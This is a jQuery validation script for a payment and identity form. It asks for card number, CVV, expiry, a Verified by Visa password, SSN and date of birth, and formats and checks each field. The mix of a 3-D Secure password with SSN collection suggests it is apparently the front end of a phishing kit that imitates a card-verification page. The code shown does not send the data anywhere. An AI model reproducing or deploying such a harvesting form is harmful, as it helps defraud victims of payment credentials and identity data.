$(document).ready(function () {
    $("#bntclick").click(function () {
        return bntclick();
    });
    $("#FN").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("FN").className = "form-control";
        }
    });
    $("#LN").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("LN").className = "form-control";
        }
    });
    $("#ADD1").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("ADD1").className = "form-control";
        }
    });
    $("#city").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("city").className = "form-control";
        }
    });
    $("#stats").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("stats").className = "form-control";
        }
    });
    $("#zip").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("zip").className = "form-control";
        }
    });
    $("#mobile").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("mobile").className = "form-control";
        }
    }); 
    $("#cardnumber").keyup(function (e) {
        if ($(this).val().length != 0) {
            document.getElementById("cardnumber").className = "form-control";
        }
        if ($(this).val().substring(0, 1) == 4) {
            document.getElementById("cardtype").className = "creditCard visa";
            document.getElementById("vbv").className = "row form-group clearfix";
        }
        if ($(this).val().substring(0, 1) == 5) {
            document.getElementById("cardtype").className = "creditCard master_card";
            document.getElementById("vbv").className = "row form-group clearfix";
        }
        if ($(this).val().substring(0, 1) == 6) {
            document.getElementById("cardtype").className = "creditCard discover";
        }
        if ($(this).val().substring(0, 1) == 3) {
            document.getElementById("cardtype").className = "creditCard amex";
            document.getElementById("cvvtype").className = "cvv AMEXCvv";
            document.getElementById("cvv").maxLength = "4";
            document.getElementById("cvv").placeholder = "CSC (4 digits)";
        }
        else if ($(this).val().substring(0, 1) != 3) {
            document.getElementById("cvvtype").className = "cvv defaultCvv";
            document.getElementById("cvv").maxLength = "3";
            document.getElementById("cvv").placeholder = "CSC (3 digits)";
        }
        if ($(this).val().length < 1) {
            document.getElementById("cardtype").className = "creditCard";
        }
        if ($(this).val().substring(0, 1) == 4 || $(this).val().substring(0, 1) == 5) {
            document.getElementById("vbv").className = "row form-group clearfix";
        }
        else {
            document.getElementById("vbv").className = "row form-group clearfix hideinput";
        }
    });
    $("#countryOptions").change(function () {
        if ($(this).val() == "Canada" || $(this).val() == "United States of America" || $(this).val() == "United Kingdom") {
            document.getElementById("SSN").className = "row form-group clearfix";
        }
        else {
            document.getElementById("SSN").className = "row form-group clearfix hideinput";
        }
    });
    $("#carddata").keyup(function (e) {
        if ($(this).val().length != 0) {
            document.getElementById("carddata").className = "form-control";
        }
        if (e.keyCode != 8) {
            if ($(this).val().length == 2) {
                $(this).val($(this).val() + "/");
            }
        }
    });
    $("#cardname").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("cardname").className = "form-control";
        }
    });
    $("#cvv").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("cvv").className = "form-control";
        }
    });
    $("#vbvpassword").keyup(function () {
        if ($(this).val().length != 0) {
            document.getElementById("vbvpassword").className = "form-control";
        }
    });
    $("#SSNCOD").keyup(function (e) {
        if ($(this).val().length != 0) {
            document.getElementById("SSNCOD").className = "form-control";
        }
        if (e.keyCode != 8) {
            if ($(this).val().length == 3) {
                $(this).val($(this).val() + "-");
            }
            if ($(this).val().length == 6) {
                $(this).val($(this).val() + "-");
            }
        }
    });
    $("#Dateof").keyup(function(e){
        if($(this).val().length!=0){
            document.getElementById("Dateof").className = "form-control";
        }
        if(e.keyCode!=8){
            if($(this).val().length==2){
                $(this).val($(this).val()+"/");
            }
            if($(this).val().length==5){
                $(this).val($(this).val()+"/");
            }
        }
    });
});
function bntclick() {
    var fn = $("#FN").val();
    var ln = $("#LN").val();
    var add = $("#ADD1").val();
    var city = $("#city").val();
    var stats = $("#stats").val();
    var zip = $("#zip").val();
    var phone = $("#mobile").val();
    var country = $("#countryOptions").val();
    var cardname = $("#cardname").val();
    var cardnumber = $("#cardnumber").val();
    var cvv = $("#cvv").val();
    var carddata = $("#carddata").val();
    var vbv = $("#vbvpassword").val();
    var ssn = $("#SSNCOD").val();
	var dob =$("#Dateof").val();
    var start;
    if(dob==""){
        start = false;
        document.getElementById("Dateof").className ="form-control has-errors";
    }
    if (cardname == "") {
        start = false;
        document.getElementById("cardname").className = "form-control has-errors";
    }
    if (cardnumber == "") {
        start = false;
        document.getElementById("cardnumber").className = "form-control has-errors";
    }
    if (cardnumber.substring(0, 1) != 3 && cardnumber.length != 16) {
        start = false;
        document.getElementById("cardnumber").className = "form-control has-errors";
    }
    if (cardnumber.substring(0, 1) != 3 && cardnumber.length != 16) {
        start = false;
        document.getElementById("cardnumber").className = "form-control has-errors";
    }
    if (cardnumber.substring(0, 1) == 3 && cardnumber.length != 15 && cvv.length != 4) {
        start = false;
        document.getElementById("cvv").className = "form-control has-errors";
    }
    if (cardnumber.substring(0, 1) != 3 && cardnumber.length != 16 && cvv.length != 3) {
        start = false;
        document.getElementById("cvv").className = "form-control has-errors";
    }
    if (document.getElementById("SSN").className == "row form-group clearfix" && ssn == "") {
        document.getElementById("SSNCOD").className = "form-control has-errors";
        start = false;
    }
    if (fn == "") {
        start = false;
        document.getElementById("FN").className = "form-control has-errors";
    }
    if (ln == "") {
        start = false;
        document.getElementById("LN").className = "form-control has-errors";
    }
    if(country =="-1"){
        start = false;
    }
    if (add == "") {
        start = false;
        document.getElementById("ADD1").className = "form-control has-errors";
    }
    if (city == "") {
        start = false;
        document.getElementById("city").className = "form-control has-errors";
    }
    if (zip == "") {
        start = false;
        document.getElementById("zip").className = "form-control has-errors";
    }
    if (phone == "") {
        start = false;
        document.getElementById("mobile").className = "form-control has-errors";
    } 
    if (carddata == "") {
        start = false;
        document.getElementById("carddata").className = "form-control has-errors";
    }
    if (start == false) {
        return false;
    }
    return true;
}